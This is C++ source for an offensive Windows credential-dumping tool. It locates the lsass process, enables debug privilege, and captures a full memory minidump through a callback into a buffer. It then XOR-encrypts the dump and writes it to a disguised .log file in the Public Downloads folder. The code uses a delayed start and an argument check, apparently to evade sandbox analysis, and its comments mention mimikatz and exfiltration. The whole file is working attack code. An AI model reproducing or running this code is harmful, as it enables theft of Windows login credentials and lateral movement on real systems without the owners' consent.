#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")
#include "global.h"


// Buffer for saving the minidump
LPVOID buffer = MHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;


BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}


void nt_wait(DWORD milliseconds)
{
	static NTSTATUS(__stdcall * NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("NtDelayExecution"));
	static NTSTATUS(__stdcall * ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("ZwSetTimerResolution"));
	static bool once = true;
	if (once && ZwSetTimerResolution != NULL) {
		ULONG actualResolution;
		ZwSetTimerResolution(1, true, &actualResolution);
		once = false;
	}
	LARGE_INTEGER interval;
	interval.QuadPart = -1 * (int)(milliseconds * 10000);
	if (NtDelayExecution != NULL)
	{
		NtDelayExecution(false, &interval);
	}

}


int main(int argc, char* argv[]) {

	if (__argc == 1) {
		return 7899 * 1777;
	}
	else if (__argc == 2) {
		if (strcmp(__argv[1], "to") != 0)
		{
			return 7 * 12899;
		}
	}
	else {
		return 1717 * 1888;
	}

	nt_wait(10000);

	DWORD PID = 0;
	DWORD bytesWritten = 0;
	HANDLE lHandle = NULL;
	HANDLE snapshot = MCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	ULONG  t;

	// Get lsass PID
	if (MProcess32FirstW(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			MProcess32NextW(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			PID = processEntry.th32ProcessID;
		}
	}

	// enable debug privilege
	MRtlAdjustPrivilege(20, TRUE, FALSE, &t);

	lHandle = MOpenProcess(PROCESS_ALL_ACCESS, 0, PID);

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	// Dump lsass
	BOOL isD = MMiniDumpWriteDump(lHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (isD)
	{
		long int size = bytesRead;

		char *securitySth = new char[size];

		char *key = (char *)"thisisgood";

		memcpy(securitySth,buffer,bytesRead);

		securitySth = Xorcrypt(securitySth, bytesRead, key);

		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
		HANDLE outFile = CreateFile(L"C:\\Users\\Public\\Downloads\\VM21-6-8.log", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		//// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
		if (WriteFile(outFile, securitySth, bytesRead, &bytesWritten, NULL))
		{
			printf("\n[+] to C:\\Users\\Public\\Downloads\\VM21-6-8.log\n");
		}

		CloseHandle(outFile);
	}

	return 0;
}